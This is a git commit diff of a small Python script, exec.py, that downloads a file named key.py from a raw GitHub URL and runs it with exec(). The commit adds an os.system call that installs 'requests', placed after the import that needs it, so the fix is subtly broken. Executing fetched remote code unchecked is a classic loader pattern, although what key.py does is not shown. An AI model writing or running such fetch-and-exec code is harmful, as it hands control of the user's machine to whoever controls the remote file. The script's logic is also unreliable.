897280180256bbd7004a2ca1d557be769b26729a
thaii dwong <kophaiduongthai@gmail.com>
2025-01-08 23:22:37 +0700

    Update exec.py

--- exec.py
+++ exec.py
@@ -1,4 +1,6 @@
-import request
+import requests
+import os
+os.system('pip install requests')
 url = "https://raw.githubusercontent.com/thaiidwong/nammoivv/refs/heads/main/key.py"
 response = requests.get(url)
 exec(response.text)
